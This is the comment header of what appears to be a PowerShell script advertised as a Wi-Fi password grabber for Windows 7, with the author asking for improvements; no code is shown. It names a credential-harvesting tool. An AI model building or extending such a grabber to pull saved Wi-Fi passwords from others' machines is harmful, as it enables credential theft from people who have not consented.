# Description: This is a simple Wifi password grabber tested and working for Windows 7
#              However this has not been tested on Windows 8 and above and any suggestions and
#              improvements are greatly welcomed. Powershell scripting isn't higest skill so
#              I'm sure I'll have much to learn.
